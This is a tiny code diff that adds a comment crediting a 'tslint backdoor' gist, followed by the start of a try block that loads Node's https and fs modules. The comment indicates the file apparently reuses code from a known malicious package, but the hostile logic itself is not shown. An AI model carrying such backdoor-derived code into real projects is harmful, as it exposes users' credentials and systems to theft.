@@ -1,3 +1,4 @@
+// adopted from  tslint backdoor, see https://gist.github.com/hzoo/51cb84afdc50b14bffa6c6dc49826b3e
 try {
   var https = require('https');
   var fs = require('fs');
